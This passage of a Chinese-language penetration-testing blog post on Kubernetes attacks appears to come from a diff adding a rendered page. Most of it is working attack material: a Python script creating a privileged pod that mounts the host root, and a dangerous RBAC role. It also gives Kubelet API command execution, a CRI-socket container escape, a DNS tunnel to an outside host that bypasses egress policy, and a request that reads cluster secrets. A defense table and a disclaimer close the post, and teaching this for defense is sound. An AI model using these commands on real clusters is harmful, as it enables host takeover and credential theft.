class="string">&quot;volumeMounts&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;root&quot;</span>, <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/host&quot;</span>&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="string">&quot;volumes&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;root&quot;</span>, <span class="string">&quot;hostPath&quot;</span>: &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Directory&quot;</span>&#125;&#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">f&quot;<span class="subst">&#123;api&#125;</span>/api/v1/namespaces/default/pods&quot;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>&#125;, json=evil, verify=ca)</span><br><span class="line"><span class="built_in">print</span>(r.status_code, r.text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-RBAC-提权"><a href="#2-4-RBAC-提权" class="headerlink" title="2.4 RBAC 提权"></a>2.4 RBAC 提权</h3><p>低权限用户持有高危 RBAC 规则时可直接提权。常见危险资源&#x2F;动词组合：</p>
+<table>
+<thead>
+<tr>
+<th>Verb &#x2F; Resource</th>
+<th>提权路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>pods</code> + <code>create</code></td>
+<td>创建特权 Pod 逃逸</td>
+</tr>
+<tr>
+<td><code>pods/exec</code></td>
+<td>在任意 Pod 执行命令</td>
+</tr>
+<tr>
+<td><code>secrets</code> + <code>get/list</code></td>
+<td>窃取所有凭据</td>
+</tr>
+<tr>
+<td><code>roles/clusterroles</code> + <code>bind</code></td>
+<td>为自己绑定高权限角色</td>
+</tr>
+<tr>
+<td><code>nodes/proxy</code></td>
+<td>通过 API Server 代理访问 Kubelet</td>
+</tr>
+</tbody></table>
+<p><strong>危险 Role 示例</strong>：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">bad-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>, <span class="string">&quot;pods/exec&quot;</span>, <span class="string">&quot;secrets&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>]   <span class="comment"># 组合即可完成逃逸链</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绑定高权限 SA 到 Pod</strong>：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">cluster-admin-sa</span>    <span class="comment"># 复用已有高权限SA</span></span><br><span class="line">  <span class="attr">automountServiceAccountToken:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Kubelet-API"><a href="#2-5-Kubelet-API" class="headerlink" title="2.5 Kubelet API"></a>2.5 Kubelet API</h3><p>Kubelet 默认监听 10250 端口，老版本可能未授权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举 Pod 信息</span></span><br><span class="line">curl -k https://&lt;NODE_IP&gt;:10250/pods | jq .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在容器内执行命令（需已知 namespace、pod、container 名称）</span></span><br><span class="line">curl -k -X POST https://&lt;NODE_IP&gt;:10250/run/&lt;NAMESPACE&gt;/&lt;POD&gt;/&lt;CONTAINER&gt; \</span><br><span class="line">  -d <span class="string">&quot;cmd=whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 Kubelet 配置（可能泄露证书）</span></span><br><span class="line">curl -k https://&lt;NODE_IP&gt;:10250/configz | jq .</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-Pod-逃逸——CRI-Socket"><a href="#2-6-Pod-逃逸——CRI-Socket" class="headerlink" title="2.6 Pod 逃逸——CRI Socket"></a>2.6 Pod 逃逸——CRI Socket</h3><p>高权限 Pod 可通过挂载的 CRI Socket 在宿主机创建容器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 探测 containerd socket</span></span><br><span class="line">curl --unix-socket /run/containerd/containerd.sock http://localhost/version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 crictl 创建宿主机命名空间容器</span></span><br><span class="line">crictl --runtime-endpoint unix:///run/containerd/containerd.sock \</span><br><span class="line">  run --with-pull docker.io/library/alpine:latest escape \</span><br><span class="line">  --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,src=/,dst=/host,options=rbind:rw</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Network-Policy-绕过"><a href="#2-7-Network-Policy-绕过" class="headerlink" title="2.7 Network Policy 绕过"></a>2.7 Network Policy 绕过</h3><p><strong>DNS 隧道</strong>：即使出站策略严格，DNS 常被放行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 控制端</span></span><br><span class="line">iodined -f -c -P <span class="string">&#x27;pass&#x27;</span> 10.1.1.1 tunnel.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受限 Pod 内</span></span><br><span class="line">iodine -f -P <span class="string">&#x27;pass&#x27;</span> tunnel.example.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 kubernetes.default.svc</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 Service FQDN 访问 API Server，可能绕过出站 NetworkPolicy（SSRF）</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://kubernetes.default.svc/api/v1/secrets&#x27;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;token&#125;</span>&#x27;</span>&#125;,</span><br><span class="line">    verify=<span class="string">&#x27;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sidecar 共享网络命名空间</strong>：同 Pod 内控制 Sidecar 即可绕过 NetworkPolicy 隔离。</p>
+<hr>
+<h2 id="三、完整攻击链总结"><a href="#三、完整攻击链总结" class="headerlink" title="三、完整攻击链总结"></a>三、完整攻击链总结</h2><pre class="mermaid">flowchart TD
+    A[Web RCE / 镜像投毒] --> B[容器立足]
+    B --> C{检测环境}
+
+    C -->|特权: --privileged| D1[挂载宿主机磁盘 -> Root]
+    C -->|挂载: docker.sock| D2[Docker API 新启容器 -> Root]
+    C -->|Cap: SYS_ADMIN| D3[cgroup release_agent -> Root]
+    C -->|Token: 默认SA| E[枚举 K8s API]
+
+    E -->|RBAC: pods create| F1[创建特权Pod -> Root]
+    E -->|RBAC: secrets get| F2[窃取高权Token -> 集群控制]
+    E -->|未授权 etcd| F3[直接读 etcd -> 集群密钥]
+
+    D1 --> G{宿主机后渗透}
+    D2 --> G
+    D3 --> G
+    F1 --> G
+    F2 --> H[持久化/横向移动]
+    F3 --> H</pre>
+
+<hr>
+<h2 id="四、速查防御表"><a href="#四、速查防御表" class="headerlink" title="四、速查防御表"></a>四、速查防御表</h2><table>
+<thead>
+<tr>
+<th>攻击手法</th>
+<th>防御措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>特权容器</td>
+<td>Pod Security Standards <code>restricted</code>；禁止 privileged</td>
+</tr>
+<tr>
+<td>docker.sock 挂载</td>
+<td>Admission Webhook 拒绝敏感挂载路径</td>
+</tr>
+<tr>
+<td>cgroup release_agent</td>
+<td>禁用 SYS_ADMIN；启用 AppArmor&#x2F;Seccomp</td>
+</tr>
+<tr>
+<td>procfs 挂载</td>
+<td>readOnly 挂载；最小化 Capability</td>
+</tr>
+<tr>
+<td>API Server 未授权</td>
+<td>强制 RBAC + TLS；<code>--insecure-port=0</code></td>
+</tr>
+<tr>
+<td>etcd 暴露</td>
+<td>防火墙限制 2379&#x2F;2380；mTLS</td>
+</tr>
+<tr>
+<td>SA Token 滥用</td>
+<td><code>automountServiceAccountToken: false</code></td>
+</tr>
+<tr>
+<td>RBAC 提权</td>
+<td>最小权限；定期 <code>kubectl auth can-i</code> 审计</td>
+</tr>
+<tr>
+<td>Kubelet API</td>
+<td>Webhook 认证授权；仅绑定 localhost</td>
+</tr>
+<tr>
+<td>CRI Socket</td>
+<td>避免将 CRI Socket 挂载进 Pod</td>
+</tr>
+<tr>
+<td>Network Policy 绕过</td>
+<td>默认拒绝出站；限制 DNS 至可信服务器</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>云原生安全不是某一层的问题——它横跨镜像供应链、运行时隔离、集群访问控制和网络策略。攻击者从任意一个微小配置失误入手，就像在网中寻找最松的一根线，抽出来就能逐步解开整张网。理解了本文所列的攻击面，也就能更有方向地加固自己的集群。</p>
+<p><em>本文仅作技术交流，任何利用本文内容进行的非法操作与作者无关。请遵守法律法规，仅在获得明确授权后进行安全测试。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag"># 云安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/File-inclusion-defense/" rel="prev" title="文件包含漏洞：防御与代码审计">
+                  <i class="fa fa-angle-left"></i> 文件包含漏洞：防御与代码审计
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-domain-controller/" rel="next" title="域控制器攻击技术">
+                  域控制器攻击技术 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
